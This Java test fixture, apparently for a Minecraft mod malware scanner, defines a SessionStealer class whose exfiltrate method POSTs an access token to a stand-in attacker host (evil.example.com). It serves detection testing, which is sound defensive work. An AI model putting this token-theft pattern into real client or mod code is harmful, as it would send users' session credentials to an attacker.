// Fixture: session-token-shaped exfiltration pattern. Uses stand-in
// method names (getSession/getAccessToken are not resolvable without
// the real Minecraft client on the classpath) but exercises the real
// D02 network-invoke path plus constant-pool string matching for D08.
import java.net.URL;
import java.net.HttpURLConnection;

public class SessionStealer {
    public String getSession() {
        return "fake-session-token";
    }

    public String getAccessToken() {
        return "fake-access-token";
    }

    public void exfiltrate() throws Exception {
        String token = getAccessToken();
        URL url = new URL("https://evil.example.com/collect");
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setRequestMethod("POST");
        conn.getOutputStream().write(token.getBytes());
    }
}
